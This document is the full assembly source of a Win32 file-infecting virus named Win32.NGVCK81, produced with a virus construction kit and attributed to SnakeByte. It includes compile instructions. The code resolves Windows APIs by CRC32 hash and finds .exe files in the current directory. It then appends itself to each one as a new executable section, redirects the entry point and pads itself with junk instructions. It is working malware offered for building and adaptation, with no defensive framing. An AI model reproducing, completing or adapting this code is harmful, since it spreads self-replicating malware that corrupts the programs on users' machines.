              
;
;
; Win32.NGVCK81 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK81
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 46
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebx
 sub ebx, offset Delta
                                        ; mov ebp, ebx
 push ebx
 pop ebp
 jmp KernelSearchStart


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear edx
 mov edx, 0
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 lea ebx, [ebp+APINames]
 xchg eax, ebx

 lea edi, [ebp+APIOffsets]


GetApisLoop: 

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; edi points to the offset
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add eax, 4
 inc eax
 add eax, 3d
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], ebx
                                        ; add edi, 4
 inc edi
 add edi, 3d
 sub edx, 1
 jnz GetApisLoop
 lea ebx, [ebp+Outbreak]
 xchg ecx, ebx

 push ecx
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+OldBase]

 push ebx
 pop dword ptr [ebp+retBase]

                                        ; clear esi
 mov esi, -23025d
 add esi, 23025d
 add esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retEIP dd 0h
 add eax,12345678h
 org $-4
 retBase dd 0h
 jmp eax



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
                                        ; check for minimum filesize
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop eax
 cmp eax, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear eax
 mov eax, 14097d
 sub eax, 14097d
 xor eax, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ecx, word ptr [eax]
 xor ecx, 'ZM'
 jz Goodfile
                                        ; mov ebx, 31982
 mov ebx, ( 31982d xor 10d )
 xor ebx, 10d
 or ebx, ebx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [eax+3Ch], 0h
 je Notagoodfile
 push dword ptr [eax+3Ch]
 pop ebx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
 jb Notagoodfile
 add ebx, eax
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
 and edx, ebx                           ; Trash
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -50817d
 add edx, 50817d
 mov eax, dword ptr [ebp+AlignReg1]
 div ecx
                                        ; add eax, 1
 inc eax
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 push ecx
                                        ; round to pages
 ror ecx, 16d
 shl ecx, 16d
                                        ; add ecx, 1
 sub ecx, -1d
GetKernelLoop:
                                        ; clear ebx
 sub ebx, ebx
 sub ecx, 1
 mov bx, word ptr [ecx+03ch]
 test bx,0f800h
 jnz GetKernelLoop
 cmp ecx, dword ptr [ecx+ebx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], ecx
 mov ebx, [ecx+3Ch]
 add ebx, ecx
 mov [KernelPE+ebp], ebx
                                        ; clear eax
 mov eax, 23592d
 sub eax, 23592d
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 mov ebx, 11575d
 sub ebx, 11575d
 add ebx, [eax+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 inc ebx
 add ebx, 27d
                                        ; get ATableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add ebx, 4
 add ebx, 4d
                                        ; get NTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
                                        ; add ebx, 4
 add ebx, 4d
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 lea ebx, GetApis
 add ebx, ebp

 push ebx
ret


;                  [ ///// * Data * \\\\\ ]

Data:
 ATableVA    dd 0h

 counter     dw 0h
 AlignReg1   dd 0h
 FileHandle  dd 0h
 sectionalign   dd 0h
 APICRC32    dd 0h
 OldBase     dd 400000h
 TempApisearch3 dd 0h
 KernelMZ    dd 0h

 APIOffsets:
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h

 PEheader    dd 0h
 MapAddress  dd 0h
 OTableVA    dd 0h
 Trash2      dd 0h
 MapHandle   dd 0h
 AlignReg2   dd 0h

 APINames:
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 08C892DDFh           ; CreateFileA
 dd 0797B49ECh           ; MapViewOfFile
 dd 094524B42h           ; UnmapViewOfFile
 dd 0C200BE21h           ; FindClose
 dd 0AA700106h           ; FindNextFileA
 dd 068624A9Dh           ; CloseHandle

 Trash1      dd 0h
 filealign   dd 0h
 KernelPE    dd 0h
 InfCounter  dd 0h
 NewSize     dd 0h
 filemask    db '*.exe',0
 FindHandle  dd 0h
 db 'Win32.NGVCK81 of SnakeByte',0
 OldEIP      dd 0h
 TempAPI     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 NTableVA    dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 Misc1       dd 0h
 NewEIP      dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ecx
 xor ecx, ecx

 push ecx
 push ecx
 push 3h
 push ecx
                                        ; add ecx, 1
 sub ecx, -1d
 push ecx
 push 80000000h or 40000000h
 lea ebx, [ebp+WFD_szFileName]
 xchg eax, ebx

 push eax
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear edx
 mov edx, -6076d
 add edx, 6076d
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
                                        ; mov ecx, 4
 mov ecx, ( 4d - 30d )
 add ecx, 30d
 push ecx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
 test eax, eax
 jz CloseFile
 push edx
 push 0
 push 0
                                        ; mov ecx, 2
 mov ecx, 2d
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], esi

                                        ; clear esi
 sub esi, esi
 xor esi, dword ptr [ebp+OldEIP]

 push esi
 pop dword ptr [ebp+retEIP]




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

 add dword ptr [ebp+Trash1], 119704     ; Trash
InfectCurDir:                           ; Infect the current directory
                                        ; mov edx, 20
 push 20d
 pop edx
 mov dword ptr [ebp+InfCounter], edx
 lea ebx, [ebp+filemask]
 xchg ebx, esi

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; clear ebx
 mov ebx, -28231d
 add ebx, 28231d
 xor ebx, dword ptr [ebp+InfCounter]
 test ebx, ebx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov esi, edi
                                        ; clear esi
 mov esi, 52801d
 sub esi, 52801d
 add esi, edi
                                        ; mov edx, edi
 push edi
 pop edx
LenCRC:
                                        ; add edx, 1
 inc edx
 cmp byte ptr [edx], 0
 jne LenCRC
 sub edx, esi
                                        ; mov edi, edx
                                        ; clear edi
 and edi, 0
 add edi, edx
                                        ; add edi, 1
 inc edi
 cld
                                        ; clear ebx
 xor ebx, ebx
 sub ebx, 1
                                        ; mov eax, ebx
 mov eax, ebx
NextByteCRC:
                                        ; clear edx
 mov edx, 3972d
 sub edx, 3972d
                                        ; clear ecx
 mov ecx, 0
 mov dl, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d
 xor dl, bl
 mov bl, bh
 mov bh, al
 mov al, ah
 mov ah, 8
NextBitCRC:
 shr cx, 1
 rcr dx, 1
jnc NoCRC
 xor dx,08320h
 xor cx,0EDB8h
NoCRC:
 dec ah
jnz NextBitCRC
 xor ebx, edx
 xor eax, ecx
 dec edi
jnz NextByteCRC
 not eax
 not ebx
 mov edx, eax
 rol edx, 16d
 mov dx, bx
 mov dword ptr [ebp+APICRC32], -1
 and dword ptr [ebp+APICRC32], edx
 popad
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear esi
 mov esi, 48421d
 sub esi, 48421d
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, esi
 add ecx, [esi+3Ch]
                                        ; get File Alignment
                                        ; add ecx, 60
 inc ecx
 add ecx, 59d
 mov eax, [ecx]
 sub ecx, 60d
 mov dword ptr [ebp+filealign], eax
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], -1
 and dword ptr [ebp+PEheader], edx
                                        ; get old Entrypoint
 mov eax, dword ptr [edx+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], eax
 mov ecx, dword ptr [edx+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], ecx
 mov ecx, [edx+38h]
 mov dword ptr [ebp+sectionalign], 0
 add dword ptr [ebp+sectionalign], ecx
                                        ; Get last section
 mov ecx, [edx+74h]
 shl ecx, 3
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [edx+6h]
 mov eax, 28h
 pushad
 mov eax, ebx
 mul eax
 push eax
 pop dword ptr [ebp+Misc1]
 popad
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+Misc1]
 add edx, 78h
 add edx, ecx
 add edx, ebx
 lea ecx, [ebp+newsection]
 xchg eax, ecx


 xchg eax, edx
 push eax
                                        ; Calculate the RVA of the new section
 mov ebx, [eax-5*8+8d]
 add ebx, [eax-5*8+12d]
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ebx
 push edx
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+nsphysicalsize], 0
 xor dword ptr [ebp+nsphysicalsize], ebx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 push VirusSize
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], edx
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], 0
 add dword ptr [ebp+nsvirtualsize], ecx
                                        ; calculate physical offset
 mov ebx,[eax-5*8+20d]
 add ebx,[eax-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ebx
 push ecx
 pop dword ptr [ebp+AlignReg2]
 Call Align
                                        ; mov ebx, -1
 mov ebx, ( -1d + 6d )
 sub ebx, 6d
 and ebx, dword ptr [ebp+AlignReg1]
 push ebx
 pop dword ptr [ebp+nsphysicaloffset]
                                        ; calculate new size
 mov edx, dword ptr [ebp+filealign]
 mov eax, ebx
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 push eax
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
 mov eax, offset newsection
 add eax, ebp

                                        ; mov edx, 64
 mov edx, ( 64d + 31d )
 sub edx, 31d
 pop edi
WriteNewSectionLoop:
 mov bl, byte ptr [eax]
 mov byte ptr [edi], bl
 sub edx, 1
                                        ; add eax, 1
 inc eax
                                        ; add edi, 1
 inc edi
 test edx, edx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+PEheader]
 add word ptr [ecx+06h], 1
 push dword ptr [ebp+nsRVA]
 pop ebx
 push ebx
 pop dword ptr [ebp+NewEIP]
                                        ; set new EIP
 mov dword ptr  [ecx+28h], ebx
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], -1d
 and dword ptr [ecx+4Ch], 'NGVC'
                                        ; clear ecx
 mov ecx, -33198d
 add ecx, 33198d
 xor ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize
 lea edx, [ebp+Virus]
 xchg edx, esi


AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 sub ebx, 1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ebx
 dec dword ptr [ebp+Trash1]             ; Trash
 push dword ptr [ebp+KernelMZ]
 pop edx
 add edx, dword ptr [ebx]
                                        ; mov ebx, edx
 push edx
 pop ebx
                                        ; mov edi, ebx
                                        ; clear edi
 sub edi, edi
 add edi, ebx
 push edi
 mov dword ptr [ebp+TempApisearch3], 0
 xor dword ptr [ebp+TempApisearch3], eax
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+APICRC32]
 sub edx, dword ptr [eax]
                                        ; add edx, 1
 inc edx
 sub edx, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop ebx
                                        ; clear eax
 xor eax, eax
 xor eax, dword ptr [ebp+TempApisearch3]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
 add esp, 4h
                                        ; retrieve the offset
                                        ; clear ecx
 mov ecx, 12228d
 sub ecx, 12228d
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 mov ebx, ecx
 movzx ecx, word ptr [ebx]
 sal ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [ecx]
 add ebx, dword ptr [ebp+KernelMZ]
 adc dword ptr [ebp+Trash1], ecx        ; Trash
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;          [ ///// * FindFiles Procedure * \\\\\ ]

 mov dword ptr [ebp+Trash1], 1532198    ; Trash

ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edx, [ebp+WFD_szFileName]
 inc ebx                                ; Trash
 xchg edi, edx

                                        ; mov eax, 276
 mov eax, 0
 add eax, 276d

ClearOldData2:
 xor ebx, eax                           ; Trash
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 add edi, 1d
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg ebx, edx

 push ebx
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edi, ecx

 push ecx
 mov ebx, dword ptr [ebp+FindHandle]
 inc eax                                ; Trash
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





CryptEnd:
 mov eax, eax                           ; Trash
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 mov edx, 0
 push edx
 call ExitProcess



end FakeCode

